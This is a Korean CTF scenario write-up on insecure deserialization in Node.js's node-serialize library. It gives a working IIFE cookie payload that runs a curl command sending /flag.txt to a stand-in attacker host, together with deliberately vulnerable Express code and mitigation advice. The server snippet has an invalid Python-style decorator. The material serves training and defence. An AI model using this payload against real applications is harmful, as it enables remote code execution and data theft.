---
title: Node.js node-serialize Insecure Deserialization leading to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, deserialization, nodejs, node-serialize, rce, cookie-tampering]
confidence: high
---

# Node.js node-serialize Insecure Deserialization leading to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Saved Customizations (저장된 개인설정 콘솔)
- **난이도**: Medium-High
- **핵심 컨셉**: 자바스크립트(Node.js) 애플리케이션의 직렬화 패키지 규격 중 하나인 **node-serialize** 라이브러리의 불안전한 역직렬화(Insecure Deserialization) 취약점 문제입니다. 서버는 사용자의 대시보드 크기, 색상 등 개인 맞춤화 설정을 직렬화 텍스트 형태로 쿠키(`profile_data`)에 보관합니다. 공격자는 자바스크립트의 함수 생성 능력을 활용하여 역직렬화 시 자동 가동되는 **즉시 실행 함수(IIFE, Immediately Invoked Function Expression)** 구조가 매핑된 악성 직렬화 JSON 문자열을 생성해 쿠키로 주입함으로써, 임의 시스템 명령을 실행시키는 RCE 공격을 성공시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Customizer**: 사이트의 테마 색상, 격자 정렬 방식을 수정한 뒤 임시 저장 버튼을 누르는 페이지.
- **Backend Service (Node.js/Express)**:
  - 수신된 JSON 설정을 `node-serialize.serialize()`로 직렬화하여 쿠키 발급.
  - 다음 페이지 접근 시 쿠키 내 문자열 데이터를 읽어 `node-serialize.unserialize()`로 역직렬화하여 적용.
- **Flag 위치**: 
  - 서버 시스템 내부: `/flag.txt`

### 2.2 취약점 지점
1. **Unsecured Object Deserialization (node-serialize)**:
   - `node-serialize` 라이브러리는 직렬화된 데이터 안에 자바스크립트 함수 소스코드가 들어있으면(`_$$ND_FUNC$$_` 접두사로 시작), 역직렬화 시 해당 소스코드를 메모리 상에서 동적 함수 객체(`eval`처럼 가동)로 재빌드하여 인스턴스를 복구합니다.
   - 이때 자바스크립트 함수명 뒤에 즉시 실행 기호인 `()`를 부착하여 텍스트로 보관하면, 역직렬화 엔진은 데이터 복구 순간 해당 자바스크립트 함수 코드를 즉시 구동시키게 되며 무제한 원격 코드 실행 환경이 성립됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Cookie) | 반환 값 | 비고 |
|------------|--------|------|------------------|---------|------|
| `/dashboard`| GET | 없음 | Cookie: `profile_data=<B64_JSON>` | 가공된 테마 화면 HTML | 역직렬화(unserialize)가 발생하는 대상 경로 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 세션 쿠키 분석
사용자는 테마를 저장한 뒤 브라우저에 저장된 쿠키 값을 살펴봅니다.
- *쿠키명*: `profile_data`
- *쿠키 값*: `eyJjb2xvciI6ImJsdWUiLCJzaXplIjoiMTAiLCJpc0FkbWluIjpmYWxzZX0=` (Base64 형식)
- *디코딩 결과*:
  ```json
  {"color":"blue","size":"10","isAdmin":false}
  ```

### Step 2. 즉시 실행 함수(IIFE) 악성 직렬화 데이터 제작
공격자는 Node.js 상에서 시스템 쉘 명령을 구동시키는 페이로드를 조립합니다.
- **공격용 Node.js 페이로드 구상**:
  ```javascript
  var exec = require('child_process').execSync;
  // 결과를 외부 서버로 탈취
  exec('curl http://attacker.local/log?flag=$(cat /flag.txt | base64)');
  ```
- **node-serialize 형식 변환**:
  `node-serialize`가 함수로 복구하고 즉시 실행할 수 있게 `_$$ND_FUNC$$_` 문자열 지시어와 함께 함수 정의 및 꼬리에 `()`를 달아 줍니다.
  ```json
  {
    "run_exploit": "_$$ND_FUNC$$_function() { require('child_process').execSync('curl http://attacker.local/log?flag=$(cat /flag.txt | base64)'); }() "
  }
  ```
  *(주의: 함수 바디 정의 끝부분에 `}()`가 붙어 있어야 객체 복원 즉시 자바스크립트 런타임에 의해 코드가 실행됩니다.)*

### Step 3. 쿠키 인코딩 및 전송
1. 제작한 JSON 문자열을 Base64 인코딩을 적용합니다.
   `eyJydW5fZXhwbG9pdCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpIHsgcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjdXJsIGh0dHA6Ly9hdHRhY2tlci5sb2NhbC9sb2c_ZmxhZz0kKGNhdCAvZmxhZy50eHQgfCBiYXNlNjQpJyk7IH0oKSAifQ==`
2. 브라우저의 쿠키 편집기 또는 curl 헤더에 해당 값을 실어 `/dashboard` 경로를 요청합니다.
   ```bash
   curl http://dashboard.challenge.local/dashboard \
        -H "Cookie: profile_data=eyJydW5fZXhwbG9pdCI6Il8kJE..."
   ```

### Step 4. flag 획득
서버는 쿠키를 획득하여 `unserialize(b64_decode(cookie))`를 수행합니다. 
이 과정에서 `run_exploit` 키의 밸류 안에 들어 있는 `_$$ND_FUNC$$_` 함수 코드가 빌드되어 즉시 자동 가동되므로 `/flag.txt` 내용을 읽는 쉘 명령어가 서버 백엔드 상에서 수행되고, 공격자 리시버 웹로그에 수집된 아웃풋 정보로부터 플래그(`FLAG{node_serialize_deserialization_iife_rce}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (Node.js Express & node-serialize 취약 예시)
const express = require('express');
const cookieParser = require('cookie-parser');
const serialize = require('node-serialize');
const app = express();

app.use(cookieParser());

@app.get("/dashboard", (req, res) => {
    const cookieData = req.cookies.profile_data;
    
    if (!cookieData) {
        // 기본값 설정 발급
        const defaultSettings = { color: "green", size: "12" };
        const serialized = serialize.serialize(defaultSettings);
        const b64 = Buffer.from(serialized).toString('base64');
        
        res.cookie("profile_data", b64);
        return res.send("Default profile loaded and cookie issued.");
    }
    
    try {
        const rawJson = Buffer.from(cookieData, 'base64').toString('ascii');
        
        // 취약점 지점: 악성 자바스크립트 함수 정의가 들은 데이터를 
        // 검증 없이 node-serialize.unserialize() 처리
        const userSettings = serialize.unserialize(rawJson);
        
        return res.send(`Settings applied: Color: ${userSettings.color}, Size: ${userSettings.size}`);
    } catch (e) {
        return res.status(500).send("Error parsing session data: " + e.message);
    }
});

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **역직렬화 전용 패키지 지양 및 정적 JSON 사용**:
   - 클라이언트 사이드 쿠키에는 실행 코드를 매핑할 수 있는 바이너리/객체 역직렬화 라이브러리를 쓰지 마십시오. 오직 정적인 구조만 파싱하는 내장 `JSON.parse` 및 `JSON.stringify`만 사용하면 함수 실행 위험이 원천 해결됩니다.
2. **세션 데이터 서명 및 무결성 검증**:
   - 쿠키 세션을 사용해야 하는 경우 세션 비밀키를 이용해 데이터에 대한 무결성 서명(예: `cookie-signature` 또는 Express의 signedCookie 기능)을 적용하여, 클라이언트가 임의로 수정해 보내는 요청을 사전 드롭시킵니다.
3. **엄격한 데이터 정화**:
   - 어쩔 수 없이 역직렬화 모듈을 써야 한다면, 데이터 파싱 전에 문자열 레벨에서 위험 키워드인 `_$$ND_FUNC$$_` 등이 바디 데이터 내에 유입되었는지 사전 체크하여 거부합니다.
